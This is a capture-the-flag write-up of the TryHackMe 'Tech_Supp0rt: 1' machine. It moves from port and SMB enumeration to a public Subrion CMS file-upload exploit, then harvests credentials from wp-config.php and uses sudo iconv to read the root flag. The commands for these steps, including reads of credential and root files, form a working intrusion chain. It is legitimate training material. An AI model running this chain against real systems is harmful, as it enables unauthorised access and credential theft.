## Overview

**Machine:** Tech_Supp0rt: 1  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**OS:** Linux  

---

## Short description:
In this write-up, I demonstrate how I gained access to the target system, starting with SMB enumeration and progressing all the way to root privileges.

This lab clearly shows how exposed services, poor credential hygiene, and vulnerable CMS software can be combined into a chain that leads to full system compromise.

## Scanning

We start with a full port scan:

```python
nmap -sC -sV -p- -T4 10.10.160.173
```
Results:

```python
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
```
## Web Enumeration

Visiting port 80, we see the default Apache page.

We run a directory brute force:

```python
gobuster dir -u http://10.10.160.173 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt
```
Interesting results:

```python
/phpinfo.php
/test
/wordpress
```
/test → a phishing site, not useful.

/phpinfo.php → just PHP info.

## Samba Enumeration

Next, we enumerate Samba shares:

```python
nmap -p139,445 --script smb-enum-shares,smb-ls 10.10.160.173
```
We discover a share:

```python
10.10.160.173\websvr:
  enter.txt
```
We download it:

```python
smbget smb://10.10.160.173/websvr/enter.txt
```
Inside ```enter.txt```, we find a hint:

```python
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:************* [cooked with magical formula]
Wordpress creds
|->
```
## Subrion CMS

Following the hint, we navigate to:

```python
http://10.10.160.173/subrion/panel/
```
We successfully access the admin panel.

The CMS version is revealed, and after some research we find a public exploit.

```python
searchsploit subrion 4.2.1

Subrion CMS 4.2.1 - Arbitrary File Upload                                         | php/webapps/49876.py

 searchsploit -m php/webapps/49876.py
```
We execute it and gain RCE.

Example usage:

```python
python3 exploit.py -u http://10.10.160.173/subrion/panel/ -l admin -p <password>
```
This provides us with a shell.

## Credential Harvesting

Inside the machine, we check the WordPress configuration:

```python
cat ../../wordpress/wp-config.php
```
We find database credentials, including a password.

Checking ```/home```, we see a user:

```python
scamsite
```
We SSH in with the discovered credentials:

```python
ssh scamsite@10.10.160.173
```
## Privilege Escalation

Checking sudo privileges:

```python
sudo -l
```
Output:

```python
(ALL) NOPASSWD: /usr/bin/iconv
```
On GTFOBins, we find a privilege escalation technique with iconv.

We read the root flag directly:

```python
LFILE=/root/root.txt

sudo iconv -f 8859_1 -t 8859_1 "$LFILE"
```

And we successfully capture the root flag
